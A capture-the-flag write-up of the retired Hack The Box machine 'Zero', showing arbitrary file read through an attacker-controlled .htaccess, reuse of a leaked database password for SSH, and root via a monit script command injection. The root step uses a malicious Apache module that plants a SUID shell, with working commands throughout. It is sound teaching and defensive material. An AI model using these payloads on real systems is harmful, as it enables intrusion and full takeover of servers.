# Zero — Hack The Box, Insane, Linux

**TL;DR:** A free static-hosting site hands out SFTP accounts whose `.htaccess`
Apache honours; `AllowOverride FileInfo` + `ap_expr`'s `file:` gives arbitrary
file read as www-data; reading `stats.php` leaks a MySQL password that is reused
for the `zroadmin` SSH login; and a root `monit` config-check that rebuilds a
command from a process's own command line lets any local user load a malicious
Apache module as root.

## Reconnaissance

Two ports, which immediately raises the value of each:

    nmap -Pn -p- 10.129.x.x
    22/tcp open ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
    80/tcp open http    Apache 2.4.41 (Ubuntu)

OpenSSH `4ubuntu0.13` is the fully-patched focal build, so 22 is not the way in.
Everything points at 80. The site is "Zero — your free home page hoster." Two PHP
pages matter. `/signup.php` contains a script that fetches
`/get-credentials-please-do-not-spam-this-thanks.php`; hitting that endpoint
returns a live credential:

    Username: zro-5e84650a  Password: 742efa45
    ...upload your pages via sftp://zero.vl...

So the app mints a real Linux SFTP account on demand, and the box names itself:
`zero.vl`. I added the vhost and logged in.

## Enumeration

The account is chrooted at `/` with a writable `public_html` (uid 1002), served
at `http://zero.vl/~zro-5e84650a/`. Uploading `<?php echo 4*11; ?>` returns it
verbatim — PHP is disabled in userdirs — but the stock `.htaccess` sets a header,
so `.htaccess` *is* processed. It is root-owned, but the directory is mine, so I
can replace it.

Probing which overrides are allowed: `AddType`, `AddHandler`, `SetHandler`,
`Header`, `ErrorDocument` all work; `Options` and `php_flag` return 500. That is
`AllowOverride FileInfo`. No mod_php, no mod_cgi, no mod_proxy in the userdir, and
SFTP `symlink` is denied (`internal-sftp -P symlink` in sshd_config, discovered
later) — so the obvious reads are all deliberately closed.

`phpinfo` at `/info.php` confirmed PHP 7.4, docroot `/var/www/html`, hostname
`zero`. `mod_status` is loaded; `/server-status` is 403 globally, but a userdir
`.htaccess` with `SetHandler server-status` re-exposes it — a nice illustration
of why FileInfo in a userdir is dangerous, though not needed for the path.

The useful primitive is `ap_expr`. FileInfo permits `Header`, and `Header`
values accept expressions:

    Header always set X-L "expr=%{base64:%{file:/etc/hostname}}"
    # X-L: emVybwo=  ->  "zero"

`%{file:...}` reads any file the Apache worker can open. That is arbitrary read as
www-data. For larger files there is a cleaner form —
`ErrorDocument 404 "%{file:/etc/passwd}"` renders the file straight into the 404
body and sidesteps the ~8 KB header limit — same access, better output. It pulled
the 334 KB `/etc/passwd`, whose only interesting non-`zro` shell users are `root`,
`ubuntu`, and `zroadmin` (uid 666).

## Foothold

The intended move here is simply to read the application source with that
primitive. `stats.php` is the prize:

    $mysqli = new mysqli("localhost","zroadmin","correct-horse-battery-staple","zro");

A hard-coded DB password — and `zroadmin` is a real shell account. Password reuse
is the most common intended path on these boxes, and it holds:

    $ ssh zroadmin@10.129.x.x      # correct-horse-battery-staple
    zroadmin@zero:~$ id
    uid=666(zroadmin) gid=666(zroadmin) groups=666(zroadmin)
    zroadmin@zero:~$ cat user.txt
    <user flag redacted>

## Privilege escalation

No sudo. `ss -ltnp` shows `monit` on `127.0.0.1:2812` and MySQL. `/opt/zroweb`
(root, 700) and two world-readable root scripts in `/usr/local/bin` stand out.
Reading `/etc/monit/conf.d/*` shows an **active** `check program zroweb-confcheck`
that runs `/usr/local/bin/zro.web-confcheck` as root each cycle (confirmed via the
monit UI with the leaked `admin:monit`). That script:

    while read pid _cmd ; do
        cmd="${_cmd/apache2/apache2ctl} -t"
        $cmd >/dev/null 2>&1
    done <<< $(pgrep -lfa "^/opt/zroweb/sbin/apache2.-k.start.-d./opt/zroweb/conf")

It takes the *command line* of any process matching that pattern, swaps
`apache2`→`apache2ctl`, appends `-t`, and runs it **unquoted as root**. A local
user fully controls a process's command line, so I control the argument vector
`httpd` is invoked with. `apache2ctl` with a non-command first arg execs
`httpd "$@"`, and — crucially — `httpd -t` (config *test*) still processes
`LoadModule`, i.e. it `dlopen`s the module, running its constructor, as root.

Payload: an Apache "module" that is just a constructor.

    __attribute__((constructor)) void go(void){
        setgid(0); setuid(0);
        system("cp /bin/bash /tmp/.rb; chmod 4755 /tmp/.rb");
    }

`gcc -shared -fPIC -nostartfiles -o /tmp/evil.so evil.c`, an `evil.conf` of one
line (`LoadModule evil_module /tmp/evil.so`), and a decoy process whose
`/proc/cmdline` matches the pattern and appends `-f /tmp/evil.conf`. `exec -a`
sets the whole crafted string as argv[0], and a tiny `for(;;) pause();` binary
keeps `/proc/cmdline` clean with no trailing junk:

    setsid bash -c 'exec -a "/opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -f /tmp/evil.conf" /tmp/forever' &

One monit cycle later root ran `httpd -t -f /tmp/evil.conf`, loaded the module,
and:

    zroadmin@zero:~$ ls -l /tmp/.rb
    -rwsr-xr-x 1 root root 1183448 /tmp/.rb
    zroadmin@zero:~$ /tmp/.rb -p -c 'id; cat /root/root.txt'
    uid=666(zroadmin) euid=0(root)
    <root flag redacted>

## What did not work

- **Log-injection → account creation (≈90 minutes, dead).** Every request on the
  vhost is logged to `accounts.log` with the *response* headers
  `%{X-Zero-Username}o %{X-Zero-Password}o`, and a root watcher onboards accounts
  from that log. Since a userdir `.htaccess` can `Header set` those headers, I
  tried to have the watcher create a non-`zro-*` account (which sshd's
  `Match User zro-*` jail would give a real shell). It never fired: the onboarder
  filters the username/password format, and it does not shell-evaluate the fields
  (a `$()`/backtick payload produced no callback). Elegant-looking, but not the
  path — and the `internal-sftp -P symlink` and the account factory were both
  deliberate misdirection around the real bug. I also burned time by letting my
  file-read `.htaccess` edits clobber the injector header on the same account.
- **SSH tunnelling.** The SFTP account permits TCP forwarding at first glance, but
  `AllowTcpForwarding no` in the `Match User zro-*` block makes every channel
  `administratively prohibited` — no pivot to MySQL/monit that way.
- **Symlink/type-map/HeaderName file reads.** All either denied
  (`internal-sftp -P symlink`) or path-confined; `ap_expr file:` was the one that
  worked.

## Lessons

- FileInfo in a user-served directory is not a small override — `Header
  "expr=%{file:...}"` and `ErrorDocument "%{file:...}"` turn it into arbitrary
  file read as the web user. Treat any attacker-writable `.htaccess` as code exec-
  adjacent.
- After any read/RCE primitive, read the *deployed* application source before
  hunting exotic bugs; a reused DB password in `stats.php` beat every clever
  Apache trick on this box.
- Never let a monitoring/health script rebuild a command from a process's own
  command line. `${cmdline/…} ; $cmd` unquoted is a root command-injection sink,
  and `httpd -t` loading `LoadModule` makes "config test" a code-exec primitive.

## Defensive takeaway

Set `AllowOverride None` on the userdir vhost. That single change sits earliest in
the chain: with no attacker-controlled `.htaccess` there is no www-data file read,
so the `zroadmin` password in `stats.php` never leaks, there is no foothold, and
the root monit-injection is never reached. Fixing the credential reuse or the
monit script each removes only one later link; removing the read primitive removes
the whole chain.

*Flag values redacted; machine IPs and VPN address generalised; the machine is retired.*
